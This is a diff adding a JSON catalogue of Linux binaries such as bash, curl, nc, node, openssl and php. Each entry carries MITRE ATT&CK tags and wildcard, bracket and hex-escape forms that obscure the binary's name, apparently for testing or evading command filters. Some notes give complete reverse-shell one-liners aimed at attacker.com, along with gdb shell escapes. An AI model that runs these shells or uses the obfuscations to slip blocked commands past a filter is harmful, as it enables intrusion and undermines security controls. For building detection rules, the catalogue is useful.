@@ -1,0 +1,5222 @@
+[
+  {
+    "Name": "awk",
+    "Description": "Text processing utility. Can be used to extract credential data, process file contents, or execute system commands via system() calls.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/awk",
+      "/bin/awk",
+      "/usr/bin/gawk"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "a?k",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'w'"
+      },
+      {
+        "Pattern": "a*k",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'w'"
+      },
+      {
+        "Pattern": "a[w]k",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "[a]wk",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on first char"
+      },
+      {
+        "Pattern": "/usr/bin/a?k",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/awk",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      },
+      {
+        "Pattern": "gaw?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Target gawk variant"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://www.gnu.org/software/gawk/manual/"
+    ]
+  },
+  {
+    "Name": "base64",
+    "Description": "Encode or decode base64 data. Widely used to obfuscate payloads, bypass content filters, and encode exfiltrated data.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/base64",
+      "/bin/base64"
+    ],
+    "Category": "encode-decode",
+    "MitreID": "T1140",
+    "Patterns": [
+      {
+        "Pattern": "bas*4",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'e6' \u2014 short form that still requires 'bas' prefix and '4' suffix"
+      },
+      {
+        "Pattern": "b??e64",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Two wildcards replace 'as' in base"
+      },
+      {
+        "Pattern": "b[a]se64",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 'a'"
+      },
+      {
+        "Pattern": "base6[4]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class on final digit"
+      },
+      {
+        "Pattern": "/usr/bin/bas*4",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Full path with star wildcard"
+      },
+      {
+        "Pattern": "/???/bin/base64",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ directory component"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/bas*4)",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/base64; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x62\\x61\\x73\\x65\\x36\\x34'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'base64'"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1140/",
+      "https://man7.org/linux/man-pages/man1/base64.1.html"
+    ]
+  },
+  {
+    "Name": "bash",
+    "Description": "GNU Bourne Again Shell. Executing bash with -i or -c allows spawning interactive shells or running commands, commonly used in reverse shells.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/bash",
+      "/usr/bin/bash"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.004",
+    "Patterns": [
+      {
+        "Pattern": "bas?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'h'"
+      },
+      {
+        "Pattern": "b*h",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'as'"
+      },
+      {
+        "Pattern": "ba[s]h",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 's'"
+      },
+      {
+        "Pattern": "b?sh",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'a'"
+      },
+      {
+        "Pattern": "b?s?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Two wildcards"
+      },
+      {
+        "Pattern": "/bin/bas?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard on last char"
+      },
+      {
+        "Pattern": "/???/bash",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /bin/ prefix"
+      },
+      {
+        "Pattern": "/b?n/b*h",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Mixed wildcards across path and command"
+      },
+      {
+        "Pattern": "b[a]sh",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "/???/b*",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Highly obfuscated full path (may match other binaries)"
+      },
+      {
+        "Pattern": "for p in /usr/{bin,local/bin}/bash; do \"$p\" && break; done",
+        "Wildcards": [
+          "{}"
+        ],
+        "Notes": "Brace expansion in for loop \u2014 tries /usr/bin/bash then /usr/local/bin/bash"
+      },
+      {
+        "Pattern": "$(ls /bin/bas?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /bin/bash; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x62\\x61\\x73\\x68'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'bash' before execution"
+      },
+      {
+        "Pattern": "shopt -s extglob; /bin/+(ba)sh",
+        "Wildcards": [
+          "+()"
+        ],
+        "Notes": "extglob +(ba) matches one or more occurrences of 'ba' \u2014 matches 'ba' in bash with full path"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/004/",
+      "https://www.gnu.org/software/bash/manual/bash.html"
+    ]
+  },
+  {
+    "Name": "cat",
+    "Description": "Concatenate and display file contents. Used for reading sensitive files like /etc/passwd, /etc/shadow, SSH keys, and configuration files.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/cat",
+      "/usr/bin/cat"
+    ],
+    "Category": "discovery",
+    "MitreID": "T1083",
+    "Patterns": [
+      {
+        "Pattern": "ca?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 't'"
+      },
+      {
+        "Pattern": "c*t",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'a'"
+      },
+      {
+        "Pattern": "c[a]t",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "ca[t]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/bin/ca?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/cat",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /bin/ prefix"
+      },
+      {
+        "Pattern": "/b?n/cat",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard in bin directory"
+      },
+      {
+        "Pattern": "c?t",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Middle wildcard"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1083/"
+    ]
+  },
+  {
+    "Name": "chmod",
+    "Description": "Change file permissions. Used post-exploitation to make dropped payloads executable.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/chmod",
+      "/usr/bin/chmod"
+    ],
+    "Category": "execution",
+    "MitreID": "T1222.002",
+    "Patterns": [
+      {
+        "Pattern": "chmo?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'd'"
+      },
+      {
+        "Pattern": "ch*d",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'mo'"
+      },
+      {
+        "Pattern": "c?mod",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'h'"
+      },
+      {
+        "Pattern": "chm[o]d",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on fourth char"
+      },
+      {
+        "Pattern": "/bin/chmo?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/chmod",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      },
+      {
+        "Pattern": "c*od",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Aggressive star wildcard"
+      },
+      {
+        "Pattern": "ch?od",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'm'"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1222/002/"
+    ]
+  },
+  {
+    "Name": "chown",
+    "Description": "Change file owner and group. Used to reassign ownership of files, directories, or setuid binaries.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/chown",
+      "/usr/bin/chown"
+    ],
+    "Category": "persistence",
+    "MitreID": "T1222.002",
+    "Patterns": [
+      {
+        "Pattern": "chow?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'n'"
+      },
+      {
+        "Pattern": "ch*n",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ow'"
+      },
+      {
+        "Pattern": "c?own",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'h'"
+      },
+      {
+        "Pattern": "cho[w]n",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on fourth char"
+      },
+      {
+        "Pattern": "/bin/chow?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/chown",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      },
+      {
+        "Pattern": "c*wn",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star wildcard for middle chars"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1222/002/"
+    ]
+  },
+  {
+    "Name": "curl",
+    "Description": "Transfer data to or from a server. Commonly used for downloading payloads, exfiltration, and C2 communication.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/curl",
+      "/bin/curl"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "cur?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'l'"
+      },
+      {
+        "Pattern": "c*l",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ur'"
+      },
+      {
+        "Pattern": "cu[r]l",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 'r'"
+      },
+      {
+        "Pattern": "c?r?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Two wildcards replace 'u' and 'l'"
+      },
+      {
+        "Pattern": "/usr/bin/cur?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path, wildcard on last char"
+      },
+      {
+        "Pattern": "/???/bin/curl",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ prefix"
+      },
+      {
+        "Pattern": "/usr/*/cur?",
+        "Wildcards": [
+          "*",
+          "?"
+        ],
+        "Notes": "Combined wildcards on directory and command"
+      },
+      {
+        "Pattern": "cur[l]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on final char"
+      },
+      {
+        "Pattern": "c[u]rl",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "/???/???/c*",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path obfuscation with mixed wildcards"
+      },
+      {
+        "Pattern": "for p in /usr/{bin,sbin}/curl; do \"$p\" && break; done",
+        "Wildcards": [
+          "{}"
+        ],
+        "Notes": "Brace expansion in for loop \u2014 tries both path alternatives"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/cur?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves the glob to full path; command substitution executes the result"
+      },
+      {
+        "Pattern": "$'\\x63\\x75\\x72\\x6c'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to the string 'curl' before execution"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://curl.se/docs/manpage.html"
+    ]
+  },
+  {
+    "Name": "dd",
+    "Description": "Convert and copy files or block devices. Used for disk imaging, raw data exfiltration, and overwriting disk regions.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/dd",
+      "/usr/bin/dd"
+    ],
+    "Category": "exfiltration",
+    "MitreID": "T1005",
+    "Patterns": [
+      {
+        "Pattern": "d?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard \u2014 very short command name; may match df/du/dh depending on PATH (use full path to avoid ambiguity)"
+      },
+      {
+        "Pattern": "/bin/d?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path with wildcard on last char \u2014 more specific than bare d?"
+      },
+      {
+        "Pattern": "/???/d?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Both path component and command name obfuscated with ?"
+      },
+      {
+        "Pattern": "$(ls /bin/dd)",
+        "Wildcards": [],
+        "Notes": "Command substitution via ls \u2014 obfuscates the path; dd is too short to use ? glob uniquely"
+      },
+      {
+        "Pattern": "$'\\x64\\x64'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'dd'"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1005/",
+      "https://man7.org/linux/man-pages/man1/dd.1.html"
+    ]
+  },
+  {
+    "Name": "find",
+    "Description": "Search for files in directory hierarchy. Pivotal for discovery \u2014 finding SUID binaries, writable directories, config files with credentials, and more.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/find",
+      "/bin/find"
+    ],
+    "Category": "discovery",
+    "MitreID": "T1083",
+    "Patterns": [
+      {
+        "Pattern": "fin?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'd'"
+      },
+      {
+        "Pattern": "f*d",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'in'"
+      },
+      {
+        "Pattern": "fi[n]d",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "f?nd",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'i'"
+      },
+      {
+        "Pattern": "fin[d]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/fin?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/f*d",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      },
+      {
+        "Pattern": "f?n?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Two wildcards"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1083/",
+      "https://man7.org/linux/man-pages/man1/find.1.html"
+    ]
+  },
+  {
+    "Name": "gdb",
+    "Description": "GNU debugger. Can execute arbitrary shell commands via the 'shell' command, call library functions directly, and load shared libraries \u2014 making it a code execution primitive.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/gdb",
+      "/bin/gdb"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "g?b",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'd'"
+      },
+      {
+        "Pattern": "gd[b]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/g?b",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path with wildcard"
+      },
+      {
+        "Pattern": "/???/bin/g?b",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ and 'd' in gdb"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/g?b)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/gdb; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x67\\x64\\x62'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'gdb'"
+      }
+    ],
+    "PlatformNotes": "gdb can run shell commands with `gdb -batch -ex 'shell whoami'`. It can also call C functions directly: `gdb -batch -ex 'call system(\"id\")'`. If gdb has SUID or sudo permissions, it becomes a privilege escalation path. GTFOBins documents gdb as a file read/write and shell escape vector.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://gtfobins.github.io/gtfobins/gdb/"
+    ]
+  },
+  {
+    "Name": "id",
+    "Description": "Print user and group information. Confirms current user UID, GID, and group memberships for privilege assessment.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/id",
+      "/bin/id"
+    ],
+    "Category": "discovery",
+    "MitreID": "T1033",
+    "Patterns": [
+      {
+        "Pattern": "[i]d",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on first char"
+      },
+      {
+        "Pattern": "i[d]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "/usr/bin/id",
+        "Wildcards": [],
+        "Notes": "Full absolute path \u2014 avoids matching shell builtin 'id'"
+      },
+      {
+        "Pattern": "/???/bin/id",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ prefix"
+      },
+      {
+        "Pattern": "/???/???/id",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path component obfuscation"
+      },
+      {
+        "Pattern": "/usr/*/id",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard in bin directory"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1033/"
+    ]
+  },
+  {
+    "Name": "nc",
+    "Description": "Netcat \u2014 the TCP/IP Swiss army knife. Used for port scanning, reverse shells, file transfers, and network pivoting.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/nc",
+      "/usr/bin/nc",
+      "/bin/netcat",
+      "/usr/bin/ncat"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.004",
+    "Patterns": [
+      {
+        "Pattern": "n?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard \u2014 may match other n? binaries; use full path for precision"
+      },
+      {
+        "Pattern": "n[c]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class on second char"
+      },
+      {
+        "Pattern": "/bin/n?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path narrows match to /bin/nc"
+      },
+      {
+        "Pattern": "/???/bin/nc",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ prefix"
+      },
+      {
+        "Pattern": "/bin/n[c]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Full path with bracket class"
+      },
+      {
+        "Pattern": "net?at",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Matches netcat with wildcard replacing 'c'"
+      },
+      {
+        "Pattern": "nc*",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix \u2014 matches nc, ncat, ncftp etc."
+      },
+      {
+        "Pattern": "n[c]*",
+        "Wildcards": [
+          "[]",
+          "*"
+        ],
+        "Notes": "Bracket then star for ncat, ncat6 variants"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/004/",
+      "https://nmap.org/ncat/"
+    ]
+  },
+  {
+    "Name": "nmap",
+    "Description": "Network mapper and port scanner. Used for network reconnaissance, host discovery, service enumeration, and OS detection.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/nmap",
+      "/usr/local/bin/nmap"
+    ],
+    "Category": "reconnaissance",
+    "MitreID": "T1046",
+    "Patterns": [
+      {
+        "Pattern": "nma?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'p'"
+      },
+      {
+        "Pattern": "n*p",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ma'"
+      },
+      {
+        "Pattern": "nm[a]p",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "n?ap",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'm'"
+      },
+      {
+        "Pattern": "nma[p]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/nma?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/n*p",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1046/",
+      "https://nmap.org/book/man.html"
+    ]
+  },
+  {
+    "Name": "node",
+    "Description": "Node.js JavaScript runtime. Can execute arbitrary JavaScript, spawn reverse shells, and make network connections.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/node",
+      "/usr/bin/nodejs",
+      "/usr/local/bin/node"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "nod?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "n*e",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'od' \u2014 may match other n*e binaries"
+      },
+      {
+        "Pattern": "no[d]e",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 'd'"
+      },
+      {
+        "Pattern": "/usr/bin/nod?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard on last char"
+      },
+      {
+        "Pattern": "/???/bin/node",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ directory"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/nod?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/node; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x6e\\x6f\\x64\\x65'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'node'"
+      }
+    ],
+    "PlatformNotes": "Node.js reverse shell: `node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\")'`. The binary may be named `nodejs` on older Debian/Ubuntu systems \u2014 use `nod*` to cover both.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://nodejs.org/api/cli.html"
+    ]
+  },
+  {
+    "Name": "openssl",
+    "Description": "Cryptography toolkit and TLS client. Can encrypt/decrypt data, create reverse shells over TLS, and act as a generic TCP client.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/openssl",
+      "/bin/openssl"
+    ],
+    "Category": "encode-decode",
+    "MitreID": "T1573",
+    "Patterns": [
+      {
+        "Pattern": "open*",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ssl' \u2014 may match other 'open*' binaries in PATH"
+      },
+      {
+        "Pattern": "openss?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'l'"
+      },
+      {
+        "Pattern": "ope?ssl",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'n'"
+      },
+      {
+        "Pattern": "o*ssl",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'pen'"
+      },
+      {
+        "Pattern": "/usr/bin/openss?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path, wildcard on last char"
+      },
+      {
+        "Pattern": "/???/bin/open*",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Mixed wildcards on path and command"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/openss?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/openssl; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x6f\\x70\\x65\\x6e\\x73\\x73\\x6c'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'openssl'"
+      }
+    ],
+    "PlatformNotes": "openssl can create encrypted reverse shells: `openssl s_client -connect attacker.com:443 | /bin/bash 2>&1 | openssl s_client -connect attacker.com:444`. The `enc` subcommand handles symmetric encryption. The `s_client` subcommand acts as a TLS-capable netcat.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1573/",
+      "https://www.openssl.org/docs/man1.1.1/man1/openssl.html"
+    ]
+  },
+  {
+    "Name": "perl",
+    "Description": "Perl interpreter. Supports arbitrary code execution, file I/O, network operations \u2014 useful for one-liner payloads and reverse shells.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/perl",
+      "/usr/local/bin/perl"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "per?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'l'"
+      },
+      {
+        "Pattern": "p*l",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'er'"
+      },
+      {
+        "Pattern": "pe[r]l",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "p?rl",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "per[l]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/per?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/p*l",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://perldoc.perl.org/"
+    ]
+  },
+  {
+    "Name": "php",
+    "Description": "PHP CLI interpreter. Can execute arbitrary PHP code, spawn reverse shells, read/write files, and make network connections.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/php",
+      "/usr/bin/php8",
+      "/usr/bin/php7",
+      "/bin/php"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "p?p",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'h' \u2014 note: may also match pip; use full path or longer glob to disambiguate"
+      },
+      {
+        "Pattern": "ph?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'p' suffix"
+      },
+      {
+        "Pattern": "p[h]p",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 'h'"
+      },
+      {
+        "Pattern": "/usr/bin/p?p",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard \u2014 more precise than bare p?p"
+      },
+      {
+        "Pattern": "/???/bin/p?p",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate both /usr/ and the 'h' in php"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/p?p)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/php; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x70\\x68\\x70'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'php'"
+      }
+    ],
+    "PlatformNotes": "PHP reverse shell one-liner: `php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'`. The CLI binary may be versioned (`php8`, `php7.4`) \u2014 adjust glob accordingly.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://www.php.net/manual/en/features.commandline.php"
+    ]
+  },
+  {
+    "Name": "pip",
+    "Description": "Python package installer. Installing packages with malicious setup.py executes arbitrary code. Can also download and run Python scripts directly.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/pip",
+      "/usr/bin/pip3",
+      "/usr/local/bin/pip",
+      "/usr/local/bin/pip3"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.006",
+    "Patterns": [
+      {
+        "Pattern": "pi?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'p' \u2014 matches pip and pip3 (with suffix)"
+      },
+      {
+        "Pattern": "p?p",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'i' \u2014 note: also matches php; use full path or context to disambiguate"
+      },
+      {
+        "Pattern": "pip[3]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class on version suffix \u2014 matches pip3"
+      },
+      {
+        "Pattern": "/usr/bin/pi?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard \u2014 resolves to /usr/bin/pip"
+      },
+      {
+        "Pattern": "/???/bin/pip",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ directory component"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/pi?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/pip; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x70\\x69\\x70'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'pip'"
+      }
+    ],
+    "PlatformNotes": "`pip install` with a local package runs `setup.py install`, executing arbitrary Python code as the installing user. `pip download` retrieves packages to disk without installing. The binary may be `pip3` on Python-3-only systems \u2014 use `pip*` or `pi?` globs to cover both.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/006/",
